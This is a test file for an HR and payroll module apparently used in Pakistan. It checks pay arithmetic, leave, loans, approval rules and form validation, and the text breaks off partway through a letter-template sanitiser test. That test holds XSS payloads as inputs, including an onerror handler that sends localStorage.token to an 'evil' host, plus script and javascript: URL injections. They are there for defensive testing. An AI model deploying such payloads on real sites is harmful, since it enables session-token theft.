// HR module — the rules that must hold whatever format HR loads.
//
//   Pure logic:  EOBI, overtime, payslip arithmetic and proration, loan
//                installments to the paisa, approval permissions, format
//                checks, letter rendering.
//   Through the real API (Fastify inject, real DB):  a leave balance that
//                refuses over-booking, an approval chain HOD → HR, a salary
//                revision that waits for its effective date, and a payroll
//                month that carries OT and a loan — then locks and recovers.
import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import Fastify, { type FastifyInstance } from 'fastify'
import { ZodError } from 'zod'
import bcrypt from 'bcryptjs'
import { serviceClient as prisma } from '../src/lib/prisma.js'
import { issueStaffSession } from '../src/modules/auth/service.js'
import { AppError } from '../src/lib/errors.js'
import { hrRoutes, csv } from '../src/modules/hr/routes.js'
import {
  DEFAULT_HR_SETTINGS, mergeSettings, eobiContribution, overtimeCents, computePayslip, EMPTY_INPUTS,
  loanInstallmentCents, canActOnStep, employedFraction, otMultiplierFor,
  leaveQuantity, leaveDaysWithin, carriedForwardDays, attendanceInputs,
  salaryInForce, allocateLoanCents, finalSettlement, accruedLeaveDays, sessiEmployerCents, EOBI_NOT_CALCULATED,
  pktToday, leaveYear, employedOn, onBooksAt, exitDay,
} from '../src/modules/hr/logic.js'
import { applyDueEffects, leaveBalancesFor, salaryForPeriod } from '../src/modules/hr/service.js'
import { sectionByKey, validateAgainst, checkFormat, HR_SECTIONS, EMPLOYEE_MASTER_FIELDS, type HrField } from '../src/modules/hr/forms.js'
import { renderLetter, sanitizeLetterHtml, DEFAULT_LETTERS } from '../src/modules/hr/letters.js'

const RS = (r: number) => r * 100 // rupees → paisa

// ─── pure logic ─────────────────────────────────────────────────────────────

describe('EOBI', () => {
  it('refuses to guess when no wage base is set', () => {
    const r = eobiContribution(RS(60000), DEFAULT_HR_SETTINGS)
    expect(r.employeeCents).toBe(0)
    expect(r.problem).toMatch(/EOBI wage base/)
  })
  it('is 1% / 5% of the fixed base, not the salary', () => {
    const s = mergeSettings({ eobi: { employeePct: 1, employerPct: 5, base: 'fixed', fixedWageCents: RS(40000) } })
    expect(eobiContribution(RS(90000), s)).toEqual({ employeeCents: RS(400), employerCents: RS(2000) })
  })
  it('can be set to use gross instead', () => {
    const s = mergeSettings({ eobi: { employeePct: 1, employerPct: 5, base: 'gross', fixedWageCents: null } })
    expect(eobiContribution(RS(50000), s)).toEqual({ employeeCents: RS(500), employerCents: RS(2500) })
  })
})

describe('overtime', () => {
  it('is hours × (gross ÷ working days ÷ hours per day) × multiplier', () => {
    // 52,000 / 26 / 8 = Rs 250/h; 3 h at 2× = Rs 1,500
    expect(overtimeCents(3, RS(52000), DEFAULT_HR_SETTINGS)).toBe(RS(1500))
    expect(overtimeCents(3, RS(52000), DEFAULT_HR_SETTINGS, 1.5)).toBe(RS(1125))
    expect(overtimeCents(0, RS(52000), DEFAULT_HR_SETTINGS)).toBe(0)
  })
  it('pays at the HR setting unless HR set a multiplier, and never outside 1–5', () => {
    expect(otMultiplierFor(undefined, DEFAULT_HR_SETTINGS)).toBe(2)
    expect(otMultiplierFor(null, DEFAULT_HR_SETTINGS)).toBe(2)
    expect(otMultiplierFor(0, DEFAULT_HR_SETTINGS)).toBe(2)
    expect(otMultiplierFor(1.5, DEFAULT_HR_SETTINGS)).toBe(1.5)
    expect(otMultiplierFor(50, DEFAULT_HR_SETTINGS)).toBe(5)
    expect(otMultiplierFor(0.2, DEFAULT_HR_SETTINGS)).toBe(1)
  })
})

describe('payslip', () => {
  const s = mergeSettings({ eobi: { employeePct: 1, employerPct: 5, base: 'fixed', fixedWageCents: RS(40000) }, latesPerDeductionDay: 3 })
  const emp = { grossSalaryCents: RS(52000), monthlyTaxCents: RS(1000), joiningDate: null, lastWorkingDay: null }

  it('adds and deducts every line, and nets to the paisa', () => {
    const r = computePayslip(emp, '2026-09', {
      ...EMPTY_INPUTS, absentDays: 1, lateCount: 4, otHours: 3, otCents: RS(1500),
      earningAdjustmentsCents: RS(2000), loanInstallmentsCents: RS(5000),
    }, s)
    const daily = RS(52000) / 26 // Rs 2,000
    // earnings 52,000 + 1,500 + 2,000; deductions absence 2,000 + late (4 lates → 1 day) 2,000 + EOBI 400 + tax 1,000 + loan 5,000
    expect(r.earningsCents).toBe(RS(55500))
    expect(r.deductionsCents).toBe(daily * 2 + RS(400) + RS(1000) + RS(5000))
    expect(r.netCents).toBe(RS(55500) - RS(10400))
    expect(r.eobiEmployerCents).toBe(RS(2000))
    expect(r.lines.find((l) => l.kind === 'employer')?.amountCents).toBe(RS(2000))
    expect(r.warnings).toEqual([])
  })

  it('pays a mid-month joiner for the days employed', () => {
    // joins 16 Sep: 15 of 30 days
    const r = computePayslip({ ...emp, joiningDate: new Date('2026-09-16') }, '2026-09', EMPTY_INPUTS, s)
    expect(r.grossCents).toBe(RS(26000))
    expect(employedFraction('2026-09', new Date('2026-09-16'), null)).toBe(0.5)
  })

  it('charges EOBI on a gross base, and SESSI, on what a joiner earned — not the full month', () => {
    const g = mergeSettings({ eobi: { employeePct: 1, employerPct: 5, base: 'gross', fixedWageCents: null }, sessi: { employerPct: 6, wageCeilingCents: null } })
    // Rs 40,000, joins 16 Sep: earns Rs 20,000
    const r = computePayslip({ ...emp, grossSalaryCents: RS(40000), monthlyTaxCents: 0, joiningDate: new Date('2026-09-16') }, '2026-09', EMPTY_INPUTS, g)
    expect(r.grossCents).toBe(RS(20000))
    expect(r.eobiEmployeeCents).toBe(RS(200))
    expect(r.eobiEmployerCents).toBe(RS(1000))
    expect(r.lines.find((l) => l.code === 'sessi_employer')?.amountCents).toBe(sessiEmployerCents(RS(20000), g))
    expect(r.lines.find((l) => l.code === 'sessi_employer')?.amountCents).toBe(RS(1200))
  })

  it('never docks more days than were worked, nor takes the salary below nothing', () => {
    // A whole month of unpaid leave at the working-day rate would be 31 × 2,000.
    const month = computePayslip({ ...emp, monthlyTaxCents: 0 }, '2026-03', { ...EMPTY_INPUTS, unpaidLeaveDays: 31 }, s)
    expect(month.lines.find((l) => l.code === 'unpaid_leave')?.amountCents).toBe(RS(52000))
    // A leaver on the 10th charged for the whole month is docked 10 days at most.
    const leaver = computePayslip({ ...emp, monthlyTaxCents: 0, lastWorkingDay: new Date('2026-03-10') }, '2026-03', { ...EMPTY_INPUTS, absentDays: 4, unpaidLeaveDays: 31 }, s)
    const unpaid = leaver.lines.find((l) => l.code === 'unpaid_leave')!
    expect(unpaid.label).toMatch(/6 days/)
    const dayLines = leaver.lines.filter((l) => l.code === 'absence' || l.code === 'unpaid_leave').reduce((a, l) => a + l.amountCents, 0)
    expect(dayLines).toBe(leaver.grossCents)
    expect(leaver.netCents).toBe(-RS(400)) // only EOBI is left to deduct — flagged, not hidden
  })

  it('flags a negative net instead of hiding it', () => {
    const r = computePayslip(emp, '2026-09', { ...EMPTY_INPUTS, deductionAdjustmentsCents: RS(100000) }, s)
    expect(r.netCents).toBeLessThan(0)
    expect(r.warnings.join(' ')).toMatch(/negative/)
  })
})

describe('loan installments', () => {
  const loan = { amountCents: RS(10000), installments: 3, firstPeriod: '2026-09' }
  it('recovers exactly the loan, the last installment taking the remainder', () => {
    let rec = 0
    const got: number[] = []
    for (const p of ['2026-08', '2026-09', '2026-10', '2026-11', '2026-12']) { const c = loanInstallmentCents(loan, p, rec); got.push(c); rec += c }
    expect(got[0]).toBe(0) // before the first month
    expect(rec).toBe(RS(10000))
    expect(got[4]).toBe(0) // nothing after it is repaid
  })
  it('still recovers a loan saved with no, negative or part installments', () => {
    for (const installments of [0, -2, 0.5]) {
      expect(loanInstallmentCents({ ...loan, installments }, '2026-09', 0), String(installments)).toBe(RS(10000))
    }
    expect(loanInstallmentCents({ ...loan, installments: 2.9 }, '2026-09', 0)).toBe(RS(5000)) // two whole installments
  })
})

describe('loan deductions HR types in', () => {
  it('spread oldest first, never beyond what a loan owes, and refuse what nobody owes', () => {
    const loans = [{ loanId: 'a', outstandingCents: RS(10000) }, { loanId: 'b', outstandingCents: RS(6000) }]
    expect(allocateLoanCents(loans, RS(14000))).toEqual([{ loanId: 'a', cents: RS(10000) }, { loanId: 'b', cents: RS(4000) }])
    expect(allocateLoanCents(loans, RS(3000))).toEqual([{ loanId: 'a', cents: RS(3000) }])
    expect(allocateLoanCents(loans, 0)).toEqual([])
    expect(allocateLoanCents(loans, RS(16001))).toBeNull()
    expect(allocateLoanCents([], RS(5000))).toBeNull()
  })
})

describe('salary in force for a month', () => {
  const D = (x: string) => new Date(x)
  const ch = (effectiveDate: string, grossCents: number, applied: boolean, beforeCents: number | null, wroteGross = applied) =>
    ({ effectiveDate: D(effectiveDate), grossCents, applied, wroteGross, beforeCents })

  it('pays a past month at the salary before a revision applied since', () => {
    const changes = [ch('2026-09-01', RS(70000), true, RS(50000))]
    expect(salaryInForce(RS(70000), changes, D('2026-08-31T23:59:59.999Z'))).toBe(RS(50000))
    expect(salaryInForce(RS(70000), changes, D('2026-09-30T23:59:59.999Z'))).toBe(RS(70000))
  })
  it('counts an approved revision for a future month without it being applied', () => {
    const changes = [ch('2026-11-01', RS(120000), false, null)]
    expect(salaryInForce(RS(70000), changes, D('2026-10-31T23:59:59.999Z'))).toBe(RS(70000))
    expect(salaryInForce(RS(70000), changes, D('2026-11-30T23:59:59.999Z'))).toBe(RS(120000))
  })
  it('keeps a backdated revision that did not overwrite a newer one to its own months', () => {
    // B (Oct, 90k) applied over 70k; A (Sep, 80k) approved later and left the master alone.
    const changes = [ch('2026-10-01', RS(90000), true, RS(70000)), ch('2026-09-01', RS(80000), true, null, false)]
    expect(salaryInForce(RS(90000), changes, D('2026-08-31T23:59:59.999Z'))).toBe(RS(70000))
    expect(salaryInForce(RS(90000), changes, D('2026-09-30T23:59:59.999Z'))).toBe(RS(80000))
    expect(salaryInForce(RS(90000), changes, D('2026-10-31T23:59:59.999Z'))).toBe(RS(90000))
  })
  it('falls back to the current salary when what a revision replaced was never recorded', () => {
    expect(salaryInForce(RS(70000), [ch('2026-09-01', RS(70000), true, null)], D('2026-08-31T23:59:59.999Z'))).toBe(RS(70000))
  })
})

describe('full & final', () => {
  const D = (x: string) => new Date(x)
  const inp = { salaryFrom: null as Date | null, otPayableCents: 0, leaveBalanceDays: 0, loanOutstandingCents: 0, deductionsCents: 0, otherAdjustmentsCents: 0 }
  const emp = { grossSalaryCents: RS(62000), joiningDate: D('2025-01-01') }

  it('pays salary only for the days after the last payroll, across months', () => {
    // Paid through July; leaves 10 Sep: all of August + 10 of 30 September days.
    const r = finalSettlement(emp, D('2026-09-10'), { ...inp, salaryFrom: D('2026-08-01') }, DEFAULT_HR_SETTINGS)
    expect(r.salaryPayable).toBe(RS(62000) + Math.round(RS(62000) * 10 / 30))
    // Paid through September already: nothing.
    expect(finalSettlement(emp, D('2026-09-10'), { ...inp, salaryFrom: D('2026-10-01') }, DEFAULT_HR_SETTINGS).salaryPayable).toBe(0)
    expect(finalSettlement(emp, D('2026-09-10'), inp, DEFAULT_HR_SETTINGS).salaryPayable).toBe(0)
  })
  it('encashes the leave earned so far this leave year, less what was taken', () => {
    const b = { entitlement: 14, carriedForward: 0, adjustments: 0, taken: 0 }
    // Joins 1 Sep, leaves 30 Sep: one month of 14 days a year.
    expect(accruedLeaveDays(b, D('2026-01-01'), D('2026-09-01'), D('2026-09-30'))).toBeCloseTo(14 / 12, 2)
    // A full year served earns it all; half a year less 5 taken is 2; overdrawn is 0.
    expect(accruedLeaveDays(b, D('2026-01-01'), D('2020-01-01'), D('2026-12-31'))).toBe(14)
    expect(accruedLeaveDays({ ...b, taken: 5 }, D('2026-01-01'), D('2020-01-01'), D('2026-06-30'))).toBe(2)
    expect(accruedLeaveDays({ ...b, taken: 10 }, D('2026-01-01'), D('2020-01-01'), D('2026-03-31'))).toBe(0)
    // Days carried in were earned in earlier years and are paid in full.
    expect(accruedLeaveDays({ ...b, carriedForward: 4 }, D('2026-01-01'), D('2020-01-01'), D('2026-06-30'))).toBe(11)
  })
})

describe('leave arithmetic', () => {
  const D = (x: string) => new Date(x)
  it('counts the days from the dates, never the number typed, except a single-day half day', () => {
    expect(leaveQuantity(D('2026-10-01'), D('2026-10-20'), 0.5)).toBe(20)
    expect(leaveQuantity(D('2026-10-01'), D('2026-10-20'), 1)).toBe(20)
    expect(leaveQuantity(D('2026-10-01'), D('2026-10-20'), 99)).toBe(20)
    expect(leaveQuantity(D('2026-10-01'), D('2026-10-20'), null)).toBe(20)
    expect(leaveQuantity(D('2026-10-01'), D('2026-10-01'), 0.5)).toBe(0.5)
    expect(leaveQuantity(D('2026-10-01'), D('2026-10-01'), 0.2)).toBe(1)
    expect(leaveQuantity(D('2026-10-01'), D('2026-10-02'), 0.5)).toBe(2)
  })
  it('charges a leave across the year end to each year for its own days', () => {
    const l = { startDate: D('2026-12-28'), endDate: D('2027-01-10'), quantity: 14 }
    expect(leaveDaysWithin(l, D('2026-01-01'), D('2026-12-31T23:59:59.999Z'))).toBe(4)
    expect(leaveDaysWithin(l, D('2027-01-01'), D('2027-12-31T23:59:59.999Z'))).toBe(10)
    // a half day stays a half day; a day outside the window costs nothing
    const half = { startDate: D('2026-09-15'), endDate: D('2026-09-15'), quantity: 0.5 }
    expect(leaveDaysWithin(half, D('2026-09-01'), D('2026-09-30'))).toBe(0.5)
    expect(leaveDaysWithin(half, D('2026-10-01'), D('2026-10-31'))).toBe(0)
  })
  it('carries unused days into the next year, capped, and never carries a deficit', () => {
    expect(carriedForwardDays(14, [], 5)).toBe(0)
    expect(carriedForwardDays(14, [{ adjustments: 0, taken: 6 }], 5)).toBe(5)       // 8 unused, cap 5
    expect(carriedForwardDays(14, [{ adjustments: 0, taken: 12 }], 5)).toBe(2)
    expect(carriedForwardDays(14, [{ adjustments: 0, taken: 6 }], null)).toBe(8)    // no cap
    expect(carriedForwardDays(14, [{ adjustments: -20, taken: 0 }], 5)).toBe(0)
    // chained: year 1 carries 5, year 2 has 14 + 5 − 16 = 3 left
    expect(carriedForwardDays(14, [{ adjustments: 0, taken: 0 }, { adjustments: 0, taken: 16 }], 5)).toBe(3)
  })
  it('takes today, and so the leave year, from the Karachi calendar, not UTC', () => {
    // 02:00 PKT on 1 October is still 30 September in UTC.
    expect(pktToday(D('2026-09-30T21:00:00Z')).toISOString()).toBe('2026-10-01T00:00:00.000Z')
    expect(pktToday(D('2026-09-30T18:59:59Z')).toISOString()).toBe('2026-09-30T00:00:00.000Z')
    // 03:00 PKT on 1 January is the new leave year.
    expect(leaveYear(pktToday(D('2026-12-31T22:00:00Z')), 1)[0].toISOString()).toBe('2027-01-01T00:00:00.000Z')
  })
  it('counts someone as employed on their last working day, and someone marked gone without one only until then', () => {
    const e = { status: 'resigned', joiningDate: D('2025-01-01'), lastWorkingDay: D('2026-09-24'), updatedAt: D('2026-09-01T10:00:00Z') }
    expect(employedOn(e, D('2026-09-24T15:00:00Z'))).toBe(true)
    expect(employedOn(e, D('2026-09-25'))).toBe(false)
    // Terminated through the master with no last day: gone from when the status changed…
    const t = { status: 'terminated', joiningDate: D('2025-01-01'), lastWorkingDay: null, updatedAt: D('2026-05-10T10:00:00Z') }
    expect(employedOn(t, D('2026-05-10'))).toBe(true)
    expect(employedOn(t, D('2026-05-11'))).toBe(false)
    expect(employedOn(t, D('2099-01-01'))).toBe(false)
    expect(exitDay(t)!.toISOString()).toBe('2026-05-10T00:00:00.000Z')
    // …or from the approved exit record's date when there is one.
    expect(employedOn(t, D('2026-04-02'), D('2026-04-01'))).toBe(false)
    expect(exitDay({ ...t, status: 'active' })).toBeNull()
    // A month's closing count leaves out someone whose last day is the 31st — they are that month's leaver.
    expect(onBooksAt({ ...e, lastWorkingDay: D('2026-08-31') }, D('2026-08-31T23:59:59.999Z'))).toBe(false)
    expect(onBooksAt({ ...e, lastWorkingDay: D('2026-08-31') }, D('2026-07-31T23:59:59.999Z'))).toBe(true)
  })
})

describe('attendance into payroll', () => {
  const D = (x: string) => new Date(x)
  const s = mergeSettings({ lateGraceMinutes: 15 })
  const from = D('2026-09-01')
  const to = D('2026-09-30T23:59:59.999Z')
  const at = (date: string, status: string, createdAt: string, lateMinutes: number | null = null) => ({ date: D(date), status, lateMinutes, createdAt: D(createdAt) })

  it('counts one entry per day — the latest — so a duplicate or a correction is not deducted twice', () => {
    const r = attendanceInputs(from, to, [
      at('2026-09-03', 'absent', '2026-09-03T10:00Z'), at('2026-09-03', 'absent', '2026-09-03T11:00Z'),
      at('2026-09-04', 'absent', '2026-09-04T10:00Z'), at('2026-09-04', 'present', '2026-09-04T12:00Z'),
      at('2026-09-05', 'half_day', '2026-09-05T10:00Z'),
    ], [], s)
    expect(r.absentDays).toBe(1.5)
  })
  it('is not an absence on a day of approved leave, and unpaid leave is not charged twice', () => {
    const r = attendanceInputs(from, to, [
      at('2026-09-10', 'absent', '2026-09-10T10:00Z'), at('2026-09-11', 'absent', '2026-09-11T10:00Z'),
      at('2026-09-20', 'absent', '2026-09-20T10:00Z'),
    ], [
      { startDate: D('2026-09-10'), endDate: D('2026-09-12'), quantity: 3, unpaid: true },
      { startDate: D('2026-09-11'), endDate: D('2026-09-12'), quantity: 2, unpaid: true }, // overlaps
      { startDate: D('2026-09-20'), endDate: D('2026-09-20'), quantity: 1, unpaid: false },
    ], s)
    expect(r.absentDays).toBe(0)
    expect(r.unpaidLeaveDays).toBe(3)
  })
  it('deducts the approved unpaid quantity, clipped to the window — a half day is half', () => {
    const r = attendanceInputs(from, to, [], [
      { startDate: D('2026-09-15'), endDate: D('2026-09-15'), quantity: 0.5, unpaid: true },
      { startDate: D('2026-09-28'), endDate: D('2026-10-04'), quantity: 7, unpaid: true },  // 3 days in September
      { startDate: D('2026-08-25'), endDate: D('2026-09-02'), quantity: 9, unpaid: true },  // 2 days in September
    ], s)
    expect(r.unpaidLeaveDays).toBe(5.5)
    // an employee who left on the 29th is not charged for the 30th
    expect(attendanceInputs(from, D('2026-09-29'), [], [{ startDate: D('2026-09-28'), endDate: D('2026-10-04'), quantity: 7, unpaid: true }], s).unpaidLeaveDays).toBe(2)
  })
  it('does not count a late within the grace minutes', () => {
    const r = attendanceInputs(from, to, [
      at('2026-09-01', 'late', '2026-09-01T10:00Z', 5), at('2026-09-02', 'late', '2026-09-02T10:00Z', 15),
      at('2026-09-03', 'late', '2026-09-03T10:00Z', 16), at('2026-09-04', 'late', '2026-09-04T10:00Z', null),
    ], [], s)
    expect(r.lateCount).toBe(2)
  })
})

describe('who can approve', () => {
  it('never lets someone approve their own request', () => {
    expect(canActOnStep('hr', { id: 'u1', role: 'hr' }, { employeeUserId: 'u1', managerUserId: null }).ok).toBe(false)
  })
  it('gives the HOD step to the reporting manager', () => {
    expect(canActOnStep('hod', { id: 'boss', role: 'manager' }, { employeeUserId: 'e', managerUserId: 'boss' }).ok).toBe(true)
    expect(canActOnStep('hod', { id: 'other', role: 'manager' }, { employeeUserId: 'e', managerUserId: 'boss' }).ok).toBe(false)
  })
  it('lets HR act for a missing HOD so nothing gets stuck', () => {
    expect(canActOnStep('hod', { id: 'h', role: 'hr' }, { employeeUserId: 'e', managerUserId: null }).ok).toBe(true)
  })
  it('marks a CEO acting outside their step as an override', () => {
    expect(canActOnStep('hod', { id: 'ceo', role: 'admin' }, { employeeUserId: 'e', managerUserId: 'boss' })).toMatchObject({ ok: true, override: true })
  })
  it('never lets the person who raised a request approve it', () => {
    const r = canActOnStep('hr', { id: 'h', role: 'hr' }, { employeeUserId: 'e', managerUserId: null, createdById: 'h' })
    expect(r.ok).toBe(false)
    expect(r.reason).toMatch(/own request/)
    // management and owner are HR approvers too, but get no bypass
    expect(canActOnStep('management', { id: 'm', role: 'management' }, { employeeUserId: 'e', managerUserId: null, createdById: 'm' }).ok).toBe(false)
    expect(canActOnStep('management', { id: 'o', role: 'owner' }, { employeeUserId: 'e', managerUserId: null, createdById: 'o' }).ok).toBe(false)
  })
  it('never lets one person sign off two steps of the same request', () => {
    const r = canActOnStep('management', { id: 'm', role: 'management' }, { employeeUserId: 'e', managerUserId: null, createdById: 'h', priorApproverIds: ['m'] })
    expect(r.ok).toBe(false)
    expect(r.reason).toMatch(/earlier step/)
    expect(canActOnStep('management', { id: 'm', role: 'management' }, { employeeUserId: 'e', managerUserId: null, createdById: 'h', priorApproverIds: ['x'] }).ok).toBe(true)
  })
  it('lets the CEO do either, recorded as an override', () => {
    expect(canActOnStep('hr', { id: 'ceo', role: 'admin' }, { employeeUserId: 'e', managerUserId: null, createdById: 'ceo' })).toMatchObject({ ok: true, override: true })
    expect(canActOnStep('management', { id: 'ceo', role: 'admin' }, { employeeUserId: 'e', managerUserId: null, createdById: 'h', priorApproverIds: ['ceo'] })).toMatchObject({ ok: true, override: true })
  })
})

describe('formats', () => {
  it('every default format passes its own checks', () => {
    for (const sec of HR_SECTIONS.filter((x) => x.kind === 'record')) {
      expect(checkFormat(sec, sec.fields ?? []), sec.key).toEqual([])
    }
  })
  it('refuses a format that drops a binding the logic needs', () => {
    const leave = sectionByKey('leave')!
    const without = leave.fields!.map((f) => (f.bind === 'endDate' ? { ...f, bind: undefined } : f))
    expect(checkFormat(leave, without).join(' ')).toMatch(/endDate/)
  })
  it('refuses a format that deletes a system field, but allows relabelling it', () => {
    const ot = sectionByKey('overtime')!
    expect(checkFormat(ot, ot.fields!.filter((f) => f.key !== 'otAmount')).join(' ')).toMatch(/cannot be removed/)
    expect(checkFormat(ot, ot.fields!.map((f) => (f.key === 'otAmount' ? { ...f, label: 'Overtime pay' } : f)))).toEqual([])
  })
  it('validates, coerces and lifts bound values into slots', () => {
    const v = validateAgainst(sectionByKey('overtime')!.fields!, { employee: 'e1', date: '2026-09-10', otHours: '3' })
    expect(v.errors).toEqual([])
    expect(v.slots).toMatchObject({ employeeId: 'e1', quantity: 3 })
    expect(validateAgainst(sectionByKey('overtime')!.fields!, { date: '2026-09-10' }).errors.map((e) => e.field)).toContain('employee')
  })
  it('never takes a readOnly field from the input, and an edit keeps the stored value', () => {
    const fields = sectionByKey('overtime')!.fields!
    const v = validateAgainst(fields, { employee: 'e1', date: '2026-09-10', otHours: 3, approvedHours: 300, otAmount: 5000000, otRate: 99 })
    expect(v.data).not.toHaveProperty('approvedHours')
    expect(v.data).not.toHaveProperty('otAmount')
    expect(v.slots).not.toHaveProperty('amountCents')
    const e = validateAgainst(fields, { employee: 'e1', date: '2026-09-10', otHours: 3, otAmount: 1 }, { stored: { otAmount: 150000, approvedHours: 2 } })
    expect(e.data).toMatchObject({ otAmount: 150000, approvedHours: 2 })
    expect(e.slots).not.toHaveProperty('amountCents')
  })
  it('refuses a field whose type does not fit the slot or employee column it binds', () => {
    const rev = sectionByKey('salary_revision')!
    const retype = (fields: HrField[], key: string, patch: Partial<HrField>) => fields.map((f) => (f.key === key ? { ...f, ...patch } : f))
    // A text "employee" would skip the company check on the id it holds.
    expect(checkFormat(rev, retype(rev.fields!, 'employee', { type: 'text' })).join(' ')).toMatch(/employeeId, which takes a employee field — not text/)
    // A plain number on amountCents would skip the rupee-to-paisa conversion.
    expect(checkFormat(rev, retype(rev.fields!, 'revisedGross', { type: 'number' })).join(' ')).toMatch(/amountCents/)
    expect(checkFormat(rev, retype(rev.fields!, 'effectiveDate', { type: 'text' })).join(' ')).toMatch(/effectiveDate/)
    const leave = sectionByKey('leave')!
    expect(checkFormat(leave, retype(leave.fields!, 'leaveType', { ref: 'shift' })).join(' ')).toMatch(/must point to leave_type/)
    expect(checkFormat(leave, retype(leave.fields!, 'handoverTo', { type: 'record', ref: 'nope' })).join(' ')).toMatch(/not an HR record section/)

    const master = { ...sectionByKey('employees')!, fields: [] }
    expect(checkFormat(master, EMPLOYEE_MASTER_FIELDS)).toEqual([])
    for (const [key, patch] of [
      ['managerId', { type: 'text' }], ['locationId', { type: 'text' }], ['departmentId', { type: 'text' }],
      ['designationId', { ref: 'grade' }], ['grossSalaryCents', { type: 'number' }], ['joiningDate', { type: 'text' }],
    ] as Array<[string, Partial<HrField>]>) {
      expect(checkFormat(master, retype(EMPLOYEE_MASTER_FIELDS, key, patch)), key).not.toEqual([])
    }
  })
  it('keeps the choice values logic compares, and adds none where an unknown one would pay wrongly', () => {
    const opts = (section: string, key: string, options: string[]) => {
      const sec = sectionByKey(section)!
      return checkFormat(sec, sec.fields!.map((f) => (f.key === key ? { ...f, options } : f))).join(' ')
    }
    // A "fine" would be paid out as an earning.
    expect(opts('payroll_adjustment', 'kind', ['bonus', 'incentive', 'allowance', 'arrears', 'deduction', 'other_deduction', 'fine'])).toMatch(/cannot have new choices \(fine\)/)
    expect(opts('payroll_adjustment', 'kind', ['bonus', 'other_deduction'])).toMatch(/must keep the choice deduction/)
    expect(opts('payroll_adjustment', 'kind', ['bonus', 'deduction', 'other_deduction'])).toBe('')
    // "Unpaid" is not "unpaid": every unpaid leave would be paid.
    expect(opts('leave_type', 'pay', ['Paid', 'Unpaid'])).toMatch(/must keep the choices paid, unpaid/)
    // Where an unknown value is harmless, HR may add one.
    expect(opts('attendance', 'status', ['present', 'absent', 'late', 'half_day', 'work_from_home'])).toBe('')
    expect(opts('attendance', 'status', ['present', 'late', 'half_day'])).toMatch(/absent/)
    expect(opts('probation_review', 'outcome', ['confirm', 'extend', 'terminate', 'review_again'])).toBe('')
    expect(opts('probation_review', 'outcome', ['confirmed', 'extend', 'terminate'])).toMatch(/confirm/)
    const master = { ...sectionByKey('employees')!, fields: [] }
    const status = EMPLOYEE_MASTER_FIELDS.map((f) => (f.key === 'status' ? { ...f, options: ['active', 'left'] } : f))
    expect(checkFormat(master, status).join(' ')).toMatch(/on_leave/)
  })
  it('accepts only real dates and HH:MM times, and reports a bad table cell instead of blanking it', () => {
    const leave = sectionByKey('leave')!.fields!
    const base = { employee: 'e1', leaveType: 't1', from: '2026-06-01' }
    for (const bad of ['2026-06-31', '2026-02-29', '1', '99999', 'June 5', '2026-13-01', '2026-06-01T25:00:00Z']) {
      expect(validateAgainst(leave, { ...base, to: bad }).errors.map((e) => e.field), bad).toEqual(['to'])
    }
    for (const good of ['2028-02-29', '2026-06-30', '2026-06-30T10:15:00.000Z', '2026-06-30T10:15']) {
      expect(validateAgainst(leave, { ...base, to: good }).errors, good).toEqual([])
    }
    expect(validateAgainst(leave, { ...base, to: '2026-06-30' }).slots.endDate).toBe('2026-06-30T00:00:00.000Z')

    const ot = sectionByKey('overtime')!.fields!
    const t = (otStart: string) => validateAgainst(ot, { employee: 'e1', date: '2026-09-10', otHours: 2, otStart })
    expect(t('25:99').errors.map((e) => e.field)).toEqual(['otStart'])
    expect(t('24:00').errors.map((e) => e.field)).toEqual(['otStart'])
    expect(t('9:05').data['otStart']).toBe('09:05')
    expect(t('23:59').errors).toEqual([])

    const deps = { fullName: 'A', dependents: [{ name: 'Sara', dateOfBirth: '2020-12-31' }, { name: 'Omar', dateOfBirth: '31/12/2020' }] }
    const v = validateAgainst(EMPLOYEE_MASTER_FIELDS, deps)
    expect(v.errors).toHaveLength(1)
    expect(v.errors[0]!.message).toMatch(/row 2: Date of birth must be a real date/)
    expect(validateAgainst(EMPLOYEE_MASTER_FIELDS, { fullName: 'A', dependents: [{ name: 'Sara', dateOfBirth: '2020-12-31' }] }).data['dependents'])
      .toEqual([expect.objectContaining({ name: 'Sara', dateOfBirth: '2020-12-31T00:00:00.000Z' })])
  })
  it('takes loan installments only as a whole number, 1 or more', () => {
    const loan = sectionByKey('loan')!.fields!
    const base = { employee: 'e1', type: 'loan', amount: RS(50000), firstDeduction: '2026-10-01' }
    for (const bad of [0, -1, 2.5]) expect(validateAgainst(loan, { ...base, installments: bad }).errors.map((e) => e.field), String(bad)).toEqual(['installments'])
    expect(validateAgainst(loan, { ...base, installments: 5 }).slots.quantity).toBe(5)
  })
  it('keeps self-service sections tied to an employee and to at least one approval step', () => {
    const tr = sectionByKey('training_request')!
    expect(checkFormat(tr, tr.fields!, [])).toEqual(expect.arrayContaining([expect.stringMatching(/approval step/)]))
    expect(checkFormat(tr, tr.fields!.filter((f) => f.bind !== 'employeeId'), tr.workflow).join(' ')).toMatch(/employeeId/)
    expect(checkFormat(tr, tr.fields!, tr.workflow)).toEqual([])
    // a section HR runs alone may still go without steps
    const shift = sectionByKey('shift')!
    expect(checkFormat(shift, shift.fields!, [])).toEqual([])
  })
  it('refuses two approval steps with the same key, which would share one decision', () => {
    const leave = sectionByKey('leave')!
    const dup = [{ key: 'step3', label: 'HR', role: 'hr' as const }, { key: 'step3', label: 'Management', role: 'management' as const }]
    expect(checkFormat(leave, leave.fields!, dup).join(' ')).toMatch(/Two approval steps use the key "step3"/)
    expect(checkFormat(leave, leave.fields!, [dup[0]!, { ...dup[1]!, key: 'step4' }])).toEqual([])
  })
})

describe('letters', () => {
  it('keeps a template to formatting: no script, handler, javascript: URL, frame or SVG', () => {
    const attacks: Array<[string, string]> = [
      ['<img src=x onerror="fetch(\'https://evil/\'+localStorage.token)">', '<img>'],
      ['<IMG SRC=x OnError=alert(1)>', '<img>'],
      ['<img/src="https://x/logo.png"/onerror=alert(1)>', '<img src="https://x/logo.png">'],
      ['<img src="javascript:alert(1)">', '<img>'],
      ['<img src="jav&#x61;script:alert(1)">', '<img>'],
      ['<img src="data:text/html,<script>alert(1)</script>">', '<img>'],
      ['<img src="data:image/png;base64,AAAA">', '<img src="data:image/png;base64,AAAA">'],
      ['<svg onload=alert(1)><circle/></svg>ok', 'ok'],
      ['<script>alert(1)</script><p>hi</p>', '<p>hi</p>'],
      ['<SCRIPT SRC=//evil/x.js></SCRIPT>after', 'after'],
      ['<scr<script>x</script>ipt>alert(1)</script>', 'xipt&gt;alert(1)'], // "scr<script" is one unknown tag, as a browser reads it
      ['<style>body{background:url(javascript:alert(1))}</style>x', 'x'],
      ['<iframe src="javascript:alert(1)"></iframe><object data=x></object>y', 'y'],
